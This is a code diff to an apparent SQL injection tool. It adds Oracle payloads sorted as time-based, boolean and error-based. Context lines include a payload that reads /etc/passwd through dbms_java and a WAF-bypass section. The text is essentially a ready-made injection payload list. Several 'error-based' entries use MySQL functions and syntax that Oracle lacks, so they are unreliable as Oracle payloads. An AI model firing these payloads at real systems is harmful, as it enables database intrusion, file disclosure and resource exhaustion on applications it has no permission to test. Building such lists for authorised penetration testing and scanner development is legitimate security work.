@@ -102,6 +102,36 @@ var Oracle = PayloadGroup{
 		{Type: "deep", Content: "'; SELECT dbms_java.runjava('oracle/aurora/server/ws_server/OALaunchClass org.apache.commons.io.FileUtils.readFileToString(new java.io.File(\"/etc/passwd\"))') FROM DUAL;--"},
 
 		// ═══════════════════════════════════════════
+		// ADVANCED TIME-BASED
+		// ═══════════════════════════════════════════
+		{Type: "time", Content: "1' AND (SELECT COUNT(*) FROM all_tables a, all_tables b, all_tables c, all_tables d, all_tables e)--"},
+		{Type: "time", Content: "1' AND (SELECT 1 FROM (SELECT 1 FROM dual a, dual b, dual c, dual d, dual e, dual f) x)--"},
+		{Type: "time", Content: "1' AND (SELECT 1 FROM (SELECT 1 FROM dual CONNECT BY ROWNUM <= 100000) x WHERE ROWNUM=1)--"},
+		{Type: "time", Content: "1' AND (SELECT 1 FROM (SELECT 1 FROM dual CONNECT BY ROWNUM <= 1000000) x WHERE ROWNUM=1)--"},
+		{Type: "time", Content: "1' AND (SELECT COUNT(*) FROM all_objects a, all_objects b) > 0--"},
+		{Type: "time", Content: "1' AND (SELECT COUNT(*) FROM all_tab_columns a, all_tab_columns b) > 0--"},
+		{Type: "time", Content: "1' AND (SELECT 1 FROM (SELECT 1,2,3,4,5,6,7,8,9,10 FROM dual CONNECT BY ROWNUM <= 10000) x)--"},
+		{Type: "time", Content: "1' AND (SELECT 1 FROM (SELECT 1 FROM dual CONNECT BY ROWNUM <= 50000) x)--"},
+
+		// ADVANCED BOOLEAN
+		// ═══════════════════════════════════════════
+		{Type: "boolean", Content: "1' AND 1=1--", Expected: "true"},
+		{Type: "boolean", Content: "1' AND 1=2--", Expected: "false"},
+		{Type: "boolean", Content: "1' AND '1'='1'--", Expected: "true"},
+		{Type: "boolean", Content: "1' AND '1'='2'--", Expected: "false"},
+		{Type: "boolean", Content: "1') AND 1=1--", Expected: "true"},
+		{Type: "boolean", Content: "1') AND 1=2--", Expected: "false"},
+		{Type: "boolean", Content: "1\" AND 1=1--", Expected: "true"},
+		{Type: "boolean", Content: "1\" AND 1=2--", Expected: "false"},
+		{Type: "boolean", Content: "1' AND 1=1-- -", Expected: "true"},
+		{Type: "boolean", Content: "1' AND 1=2-- -", Expected: "false"},
+
+		// ADVANCED ERROR-BASED
+		// ═══════════════════════════════════════════
+		{Type: "error", Content: "1' AND (SELECT 1 FROM (SELECT 1,COUNT(*),CONCAT((SELECT user FROM dual),':',FLOOR(RAND()*2))x FROM all_tables GROUP BY x) a)--"},
+		{Type: "error", Content: "1' AND (SELECT 1 FROM (SELECT 1,2,3,COUNT(*) FROM all_tables GROUP BY CONCAT((SELECT user FROM dual),FLOOR(RAND()*2))) a)--"},
+		{Type: "error", Content: "1' AND (SELECT 1 FROM (SELECT 1,COUNT(*),CONCAT((SELECT banner FROM v$version WHERE ROWNUM=1),':',FLOOR(RAND()*2))x FROM all_tables GROUP BY x) a)--"},
+
 		// WAF BYPASS
 		// ═══════════════════════════════════════════
 		{Type: "bypass", Content: "' OR 1=1--"},
